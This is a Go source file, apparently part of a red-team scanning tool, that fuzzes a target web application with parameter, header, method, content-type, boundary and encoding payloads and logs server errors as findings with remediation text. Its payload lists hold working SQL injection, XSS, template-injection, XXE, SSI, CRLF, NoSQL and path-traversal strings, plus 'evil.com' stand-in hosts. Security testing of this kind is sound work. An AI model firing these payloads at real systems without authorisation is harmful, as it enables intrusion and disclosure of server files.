package scanner

import (
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"strings"
	"sync"
	"time"

	"red-team-agent/internal/config"
)

// RunFuzz — Phase 10: Fuzzing Stress
func (s *Scanner) RunFuzz(ctx context.Context, target config.Target) (result *PhaseResult) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[Fuzz] Panic recovered: %v", r)
			if result == nil {
				result = &PhaseResult{Phase: "Fuzzing Stress"}
			}
		}
	}()
	start := time.Now()
	result = &PhaseResult{Phase: "Fuzzing Stress"}

	baseURL := strings.TrimRight(target.URL, "/")

	// Test 1: Parameter Fuzzing
	s.fuzzParameters(ctx, baseURL, result)

	// Test 2: Header Fuzzing
	s.fuzzHeaders(ctx, baseURL, result)

	// Test 3: Method Fuzzing
	s.fuzzMethods(ctx, baseURL, result)

	// Test 4: Content-Type Fuzzing
	s.fuzzContentTypes(ctx, baseURL, result)

	// Test 5: Boundary Fuzzing
	s.fuzzBoundaries(ctx, baseURL, result)

	// Test 6: Encoding Fuzzing
	s.fuzzEncodings(ctx, baseURL, result)

	result.Duration = time.Since(start)
	log.Printf("[Fuzz] Complete: %d findings", len(result.Findings))
	return result
}

// fuzzParameters sends fuzzed values for common parameters.
func (s *Scanner) fuzzParameters(ctx context.Context, baseURL string, result *PhaseResult) {
	log.Printf("[Fuzz] Parameter fuzzing")

	ctxTimeout, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	fuzzValues := []string{
		strings.Repeat("A", 10000),     // long string
		strings.Repeat("%s", 100),      // format string
		strings.Repeat("%n", 100),      // format string
		strings.Repeat("%x", 100),      // format string
		"{{7*7}}",                      // template injection
		"${7*7}",                       // expression language
		"<%=7*7%>",                     // ERB
		"${{7*7}}",                     // GitHub Actions
		"#{7*7}",                       // Ruby interpolation
		"*{7*7}",                       // Jinja2
		"{{constructor.constructor('return this')()}}", // sandbox escape
		"\x00",                         // null byte
		"..\x00",                       // null byte traversal
		"admin' OR 1=1--",             // SQLi
		"<script>alert(1)</script>",    // XSS
		"{{'<script>alert(1)</script>'}}", // template XSS
		strings.Repeat("🐱", 500),      // unicode flood
		"🇺🇸🇬🇧🇫🇷🇩🇪🇯🇵🇨🇳🇰🇷🇷🇺", // flag emoji
		"test\r\nX-Injected: true",     // CRLF
		"test%0d%0aX-Injected: true",   // encoded CRLF
		"/../../etc/passwd",            // path traversal
		"file:///etc/passwd",           // file URI
		"ldap://evil.com",              // LDAP
		"gopher://evil.com",            // gopher
	}

	commonParams := []string{
		"id", "user", "username", "name", "query", "search", "q",
		"page", "limit", "offset", "sort", "order", "filter",
		"file", "path", "dir", "folder", "url", "redirect",
		"callback", "format", "type", "action", "cmd", "exec",
	}

	testEndpoints := []string{"/", "/api", "/search", "/api/v1/users", "/api/v1/data"}

	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 10) // limit concurrency

	testCount := 0
	maxTests := 50 // cap total tests to avoid excessive requests

	for _, endpoint := range testEndpoints {
		for _, param := range commonParams {
			if testCount >= maxTests {
				break
			}
			for _, fuzzVal := range fuzzValues {
				if testCount >= maxTests {
					break
				}
				select {
				case <-ctxTimeout.Done():
					wg.Wait()
					return
				default:
				}

				testCount++
				sem <- struct{}{}
				wg.Add(1)

				go func(ep, p, fv string) {
					defer wg.Done()
					defer func() { <-sem }()

					u := baseURL + ep
					resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
						Method:  "GET",
						URL:     u,
						Params:  map[string]string{p: fv},
						Headers: map[string]string{"User-Agent": s.HTTPClient.UserAgent},
					})
					if err != nil {
						return
					}

					if resp.StatusCode == 500 {
						mu.Lock()
						result.Findings = append(result.Findings, Finding{
							Type:        "param-fuzz-500",
							Severity:    "medium",
							Title:       fmt.Sprintf("Server Error on Fuzzed Parameter '%s'", p),
							Description: fmt.Sprintf("Sending fuzzed value to parameter '%s' caused a 500 error. Payload: %s", p, truncateStr(fv, 80)),
							URL:         u,
							Parameter:   p,
							Payload:     truncateStr(fv, 200),
							Evidence:    fmt.Sprintf("Status: %d, Body: %s", resp.StatusCode, truncateStr(resp.Body, 200)),
							Remediation: "Validate and sanitize all input parameters. Implement input length limits.",
						})
						mu.Unlock()
					}
				}(endpoint, param, fuzzVal)
			}
			if testCount >= maxTests {
				break
			}
		}
		if testCount >= maxTests {
			break
		}
	}
	wg.Wait()
}

// fuzzHeaders sends requests with fuzzed header values.
func (s *Scanner) fuzzHeaders(ctx context.Context, baseURL string, result *PhaseResult) {
	log.Printf("[Fuzz] Header fuzzing")

	ctxTimeout, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	headersToFuzz := []string{
		"User-Agent", "Referer", "Cookie", "X-Forwarded-For",
		"X-Real-IP", "Accept", "Accept-Language", "Authorization",
		"X-Custom-Header", "X-Request-ID", "Origin",
	}

	fuzzHeaderValues := []struct {
		name  string
		value string
	}{
		{"long-value", strings.Repeat("A", 8000)},
		{"special-chars", "!@#$%^&*(){}[]|\\:;\"'<>,.?/~`"},
		{"null-byte", "test\x00injection"},
		{"newline", "test\r\nX-Injected: true"},
		{"format-string", "%s%s%s%s%s%n%x%d"},
		{"unicode-flood", strings.Repeat("🔥", 500)},
		{"template-lfi", "{{7*7}}"},
		{"ssi", "<!--#exec cmd='ls'-->"},
		{"crlf-double", "test\r\n\r\n<html>injected</html>"},
		{"empty", ""},
	}

	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 10)

	for _, headerName := range headersToFuzz {
		for _, fv := range fuzzHeaderValues {
			select {
			case <-ctxTimeout.Done():
				wg.Wait()
				return
			default:
			}

			sem <- struct{}{}
			wg.Add(1)

			go func(hn, val string) {
				defer wg.Done()
				defer func() { <-sem }()

				resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
					Method: "GET",
					URL:    baseURL + "/",
					Headers: map[string]string{
						"User-Agent": s.HTTPClient.UserAgent,
						hn:           val,
					},
				})
				if err != nil {
					return
				}

				if resp.StatusCode == 500 {
					mu.Lock()
					result.Findings = append(result.Findings, Finding{
						Type:        "header-fuzz-500",
						Severity:    "medium",
						Title:       fmt.Sprintf("Server Error on Malformed Header '%s'", hn),
						Description: fmt.Sprintf("Fuzzing header '%s' caused a 500 error.", hn),
						URL:         baseURL + "/",
						Payload:     fmt.Sprintf("%s: %s", hn, truncateStr(val, 80)),
						Evidence:    fmt.Sprintf("Status: %d, Body: %s", resp.StatusCode, truncateStr(resp.Body, 200)),
						Remediation: "Sanitize and validate all header inputs. Don't reflect headers in responses.",
					})
					mu.Unlock()
				}
			}(headerName, fv.value)
		}
	}
	wg.Wait()
}

// fuzzMethods tests unusual HTTP methods.
func (s *Scanner) fuzzMethods(ctx context.Context, baseURL string, result *PhaseResult) {
	log.Printf("[Fuzz] Method fuzzing")

	ctxTimeout, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	unusualMethods := []string{
		"TRACE", "TRACK", "CONNECT", "PROPFIND", "PROPPATCH",
		"MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
		"PATCH", "OPTIONS", "HEAD", "PURGE", "LINK", "UNLINK",
	}

	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 10)

	for _, method := range unusualMethods {
		select {
		case <-ctxTimeout.Done():
			wg.Wait()
			return
		default:
		}

		sem <- struct{}{}
		wg.Add(1)

		go func(m string) {
			defer wg.Done()
			defer func() { <-sem }()

			resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
				Method:  m,
				URL:     baseURL + "/",
				Headers: map[string]string{"User-Agent": s.HTTPClient.UserAgent},
			})
			if err != nil {
				return
			}

			// Flag if method returns 200 (accepted) — especially for dangerous methods
			if resp.StatusCode == 200 {
				mu.Lock()
				result.Findings = append(result.Findings, Finding{
					Type:        "unusual-method",
					Severity:    "low",
					Title:       fmt.Sprintf("Unusual HTTP Method '%s' Accepted", m),
					Description: fmt.Sprintf("Server accepts the %s method which may not be intended.", m),
					URL:         baseURL + "/",
					Payload:     m,
					Evidence:    fmt.Sprintf("Status: %d, Body: %s", resp.StatusCode, truncateStr(resp.Body, 200)),
					Remediation: "Disable unused HTTP methods. Only allow GET, POST, PUT, DELETE, HEAD, OPTIONS as needed.",
				})
				mu.Unlock()
			}

			// TRACE is special — check if it reflects the request (XST vulnerability)
			if m == "TRACE" && resp.StatusCode == 200 {
				if strings.Contains(resp.Body, "User-Agent") || strings.Contains(resp.Body, "Cookie") {
					mu.Lock()
					// Upgrade severity for TRACE reflection
					for i, f := range result.Findings {
						if f.Type == "unusual-method" && f.Payload == "TRACE" {
							result.Findings[i].Severity = "medium"
							result.Findings[i].Title = "Cross-Site Tracing (XST) Vulnerability"
							result.Findings[i].Description = "TRACE method reflects request headers, enabling Cross-Site Tracing attacks."
							result.Findings[i].Remediation = "Disable TRACE method immediately."
							break
						}
					}
					mu.Unlock()
				}
			}
		}(method)
	}
	wg.Wait()
}

// fuzzContentTypes sends POST/PUT with various Content-Types and malformed bodies.
func (s *Scanner) fuzzContentTypes(ctx context.Context, baseURL string, result *PhaseResult) {
	log.Printf("[Fuzz] Content-Type fuzzing")

	ctxTimeout, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	contentTypes := []struct {
		ct   string
		body string
	}{
		{"application/json", `{"test": "` + strings.Repeat("A", 5000) + `"}`},
		{"application/json", `{invalid json {{{`},
		{"application/json", `null`},
		{"application/json", `"string"`},
		{"application/json", `{"a": {"b": {"c": {"d": "deep"}}}}`},
		{"application/xml", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>`},
		{"application/xml", `<root><` + strings.Repeat("A", 5000) + `</root>`},
		{"multipart/form-data; boundary=----WebKitFormBoundary", "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"test\"\r\n\r\n" + strings.Repeat("B", 5000) + "\r\n------WebKitFormBoundary--\r\n"},
		{"text/plain", strings.Repeat("C", 5000)},
		{"application/octet-stream", strings.Repeat("\x00\x01\x02\x03", 1000)},
		{"application/json", `{"$gt": "", "$ne": "", "$where": "1=1"}`}, // NoSQL injection
		{"application/json", `{"__proto__": {"admin": true}}`},           // prototype pollution
		{"application/json", `{"constructor": {"prototype": {"admin": true}}}`},
		{"application/x-www-form-urlencoded", "test=" + strings.Repeat("D", 5000)},
	}

	testEndpoints := []string{"/", "/api", "/api/v1", "/login", "/api/users"}

	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 10)

	for _, ep := range testEndpoints {
		for _, ct := range contentTypes {
			select {
			case <-ctxTimeout.Done():
				wg.Wait()
				return
			default:
			}

			sem <- struct{}{}
			wg.Add(1)

			go func(endpoint string, c struct {
				ct   string
				body string
			}) {
				defer wg.Done()
				defer func() { <-sem }()

				resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
					Method: "POST",
					URL:    baseURL + endpoint,
					Headers: map[string]string{
						"User-Agent":   s.HTTPClient.UserAgent,
						"Content-Type": c.ct,
					},
					Body: c.body,
				})
				if err != nil {
					return
				}

				if resp.StatusCode == 500 {
					mu.Lock()
					result.Findings = append(result.Findings, Finding{
						Type:        "content-type-fuzz-500",
						Severity:    "medium",
						Title:       fmt.Sprintf("Server Error on Content-Type '%s'", truncateStr(c.ct, 50)),
						Description: fmt.Sprintf("Sending POST with Content-Type '%s' and malformed body caused a 500 error.", truncateStr(c.ct, 50)),
						URL:         baseURL + endpoint,
						Payload:     fmt.Sprintf("Content-Type: %s", truncateStr(c.ct, 80)),
						Evidence:    fmt.Sprintf("Status: %d, Body: %s", resp.StatusCode, truncateStr(resp.Body, 200)),
						Remediation: "Validate Content-Type headers. Implement strict content-type checking and error handling.",
					})
					mu.Unlock()
				}
			}(ep, ct)
		}
	}
	wg.Wait()
}

// fuzzBoundaries sends extreme payloads: large, empty, binary, deeply nested.
func (s *Scanner) fuzzBoundaries(ctx context.Context, baseURL string, result *PhaseResult) {
	log.Printf("[Fuzz] Boundary fuzzing")

	ctxTimeout, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	type boundaryTest struct {
		name        string
		contentType string
		body        string
	}

	// Generate deeply nested JSON (50 levels)
	deepJSON := buildDeepJSON(50)

	// Generate 100KB payload
	largePayload := strings.Repeat("X", 100*1024)

	// Binary garbage
	var binaryGarbage strings.Builder
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 4096; i++ {
		binaryGarbage.WriteByte(byte(r.Intn(256)))
	}

	tests := []boundaryTest{
		{"large-100kb-json", "application/json", `{"data": "` + largePayload + `"}`},
		{"empty-body-json", "application/json", ""},
		{"empty-body-form", "application/x-www-form-urlencoded", ""},
		{"deeply-nested-json-50", "application/json", deepJSON},
		{"binary-garbage", "application/octet-stream", binaryGarbage.String()},
		{"partial-json", "application/json", `{"key": "value"`},
		{"json-array-overflow", "application/json", "[" + strings.Repeat("1,", 10000) + "1]"},
		{"unicode-null-json", "application/json", `{"\u0000": "\u0000"}`},
	}

	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 10)

	for _, t := range tests {
		select {
		case <-ctxTimeout.Done():
			wg.Wait()
			return
		default:
		}

		sem <- struct{}{}
		wg.Add(1)

		go func(bt boundaryTest) {
			defer wg.Done()
			defer func() { <-sem }()

			resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
				Method: "POST",
				URL:    baseURL + "/",
				Headers: map[string]string{
					"User-Agent":   s.HTTPClient.UserAgent,
					"Content-Type": bt.contentType,
				},
				Body: bt.body,
			})
			if err != nil {
				// Timeout itself is interesting — could indicate server struggling
				if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline") {
					mu.Lock()
					result.Findings = append(result.Findings, Finding{
						Type:        "boundary-fuzz-timeout",
						Severity:    "medium",
						Title:       fmt.Sprintf("Server Timeout on '%s' Payload", bt.name),
						Description: fmt.Sprintf("Sending '%s' payload caused server timeout.", bt.name),
						URL:         baseURL + "/",
						Payload:     bt.name,
						Evidence:    err.Error(),
						Remediation: "Implement request size limits and payload validation.",
					})
					mu.Unlock()
				}
				return
			}

			if resp.StatusCode == 500 {
				mu.Lock()
				result.Findings = append(result.Findings, Finding{
					Type:        "boundary-fuzz-500",
					Severity:    "medium",
					Title:       fmt.Sprintf("Server Error on '%s' Payload", bt.name),
					Description: fmt.Sprintf("Sending '%s' payload caused a 500 error.", bt.name),
					URL:         baseURL + "/",
					Payload:     bt.name,
					Evidence:    fmt.Sprintf("Status: %d, Body: %s", resp.StatusCode, truncateStr(resp.Body, 200)),
					Remediation: "Implement request size limits and strict payload validation.",
				})
				mu.Unlock()
			}
		}(t)
	}
	wg.Wait()
}

// fuzzEncodings sends double-encoded, URL-encoded, base64-encoded payloads.
func (s *Scanner) fuzzEncodings(ctx context.Context, baseURL string, result *PhaseResult) {
	log.Printf("[Fuzz] Encoding fuzzing")

	ctxTimeout, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	type encodedTest struct {
		name   string
		param  string
		value  string
	}

	encodedPayloads := []encodedTest{
		// Double-encoded
		{"double-encoded-dotdot", "path", "%252e%252e%252f%252e%252e%252fetc%252fpasswd"},
		{"double-encoded-null", "q", "%2500"},
		{"double-encoded-slash", "path", "%252f"},
		{"double-encoded-space", "q", "%2520"},
		// URL-encoded special chars
		{"url-encoded-lt", "q", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"},
		{"url-encoded-quote", "q", "%27%20OR%20%271%27%3D%271"},
		{"url-encoded-backslash", "path", "%5c"},
		// Base64-encoded payloads
		{"base64-sqli", "data", base64.StdEncoding.EncodeToString([]byte("' OR 1=1--"))},
		{"base64-xss", "data", base64.StdEncoding.EncodeToString([]byte("<script>alert(1)</script>"))},
		{"base64-pathtraversal", "data", base64.StdEncoding.EncodeToString([]byte("../../etc/passwd"))},
		// Mixed encoding
		{"mixed-unicode", "q", "\\u0022\\u003e\\u003cscript\\u003e"},
		{"overlong-utf8", "q", "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"},
		{"percent-null", "q", "%00"},
		{"percent-newline", "q", "%0d%0aInjected-Header:%20true"},
	}

	commonEndpoints := []string{"/", "/api", "/search", "/api/v1/data"}

	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 10)

	for _, ep := range commonEndpoints {
		for _, p := range encodedPayloads {
			select {
			case <-ctxTimeout.Done():
				wg.Wait()
				return
			default:
			}

			sem <- struct{}{}
			wg.Add(1)

			go func(endpoint string, payload encodedTest) {
				defer wg.Done()
				defer func() { <-sem }()

				u := baseURL + endpoint
				resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
					Method:  "GET",
					URL:     u,
					Params:  map[string]string{payload.param: payload.value},
					Headers: map[string]string{"User-Agent": s.HTTPClient.UserAgent},
				})
				if err != nil {
					return
				}

				// Check for interesting responses
				body := strings.ToLower(resp.Body)

				// Check if server decoded the payload and reflected it
				indicators := []string{"root:", "/bin/bash", "alert(", "etc/passwd", "error in sql", "syntax error"}
				for _, ind := range indicators {
					if strings.Contains(body, ind) {
						mu.Lock()
						result.Findings = append(result.Findings, Finding{
							Type:        "encoding-fuzz-reflection",
							Severity:    "high",
							Title:       fmt.Sprintf("Server Decodes and Reflects '%s' Payload", payload.name),
							Description: fmt.Sprintf("Encoding payload '%s' was decoded by the server and indicator '%s' found in response.", payload.name, ind),
							URL:         u,
							Parameter:   payload.param,
							Payload:     truncateStr(payload.value, 100),
							Evidence:    fmt.Sprintf("Status: %d, Indicator: %s, Body: %s", resp.StatusCode, ind, truncateStr(resp.Body, 200)),
							Remediation: "Do not decode user input multiple times. Validate input after all decoding steps.",
						})
						mu.Unlock()
						return
					}
				}

				if resp.StatusCode == 500 {
					mu.Lock()
					result.Findings = append(result.Findings, Finding{
						Type:        "encoding-fuzz-500",
						Severity:    "medium",
						Title:       fmt.Sprintf("Server Error on '%s' Encoded Payload", payload.name),
						Description: fmt.Sprintf("Sending '%s' encoded payload caused a 500 error.", payload.name),
						URL:         u,
						Parameter:   payload.param,
						Payload:     truncateStr(payload.value, 100),
						Evidence:    fmt.Sprintf("Status: %d, Body: %s", resp.StatusCode, truncateStr(resp.Body, 200)),
						Remediation: "Validate all decoded input. Implement proper error handling.",
					})
					mu.Unlock()
				}
			}(ep, p)
		}
	}
	wg.Wait()
}

// buildDeepJSON creates a deeply nested JSON object with the given depth.
func buildDeepJSON(depth int) string {
	if depth <= 0 {
		return `"leaf"`
	}
	return `{"level": ` + fmt.Sprintf("%d", depth) + `, "nested": ` + buildDeepJSON(depth-1) + `}`
}
